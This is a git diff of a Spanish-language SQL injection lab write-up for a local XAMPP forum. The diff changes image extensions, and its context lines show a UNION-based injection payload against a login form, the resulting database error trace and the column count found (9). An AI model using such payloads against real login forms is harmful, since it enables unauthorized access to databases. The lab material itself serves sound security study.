@@ -51,7 +51,7 @@ Vamos obteniendo errores
 Notice: Use of undefined constant forum - assumed 'forum' in C:\xampp\htdocs\foro\libraries\User.php on line 9
 Fatal error: Uncaught PDOException: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns in C:\xampp\htdocs\foro\libraries\Database.php:56 Stack trace: #0 C:\xampp\htdocs\foro\libraries\Database.php(56): PDOStatement->execute() #1 C:\xampp\htdocs\foro\libraries\Database.php(65): Database->execute() #2 C:\xampp\htdocs\foro\libraries\User.php(69): Database->single() #3 C:\xampp\htdocs\foro\login.php(11): User->login('999' UNION sele...', 'd41d8cd98f00b20...') #4 {main} thrown in C:\xampp\htdocs\foro\libraries\Database.php on line 56
 ```
-![](capturas/sql-injection-lab2.jpg)
+![](capturas/sql-injection-lab2.png)
 
 
 Continuamos metiendo null hasta que pase a darnos otro tipo de error o de el resultado esperado, que conseguimos loguearnos:
@@ -59,8 +59,8 @@ Inyección →
 ```
 999' UNION select null, null, null, null, null, null, null, null, null FROM information_Schema.columns, information_Schema.tables WHERE information_Schema.tables.table_name = information_Schema.columns.table_name; #
 ```
-![](capturas/sql-injection-lab2-2.jpg)
-![](capturas/sql-injection-lab2-3.jpg)
+![](capturas/sql-injection-lab2-2.png)
+![](capturas/sql-injection-lab2-3.png)
 
 Número de columnas de la tabla que se usa en el formulario de login: 9 columnas.
 
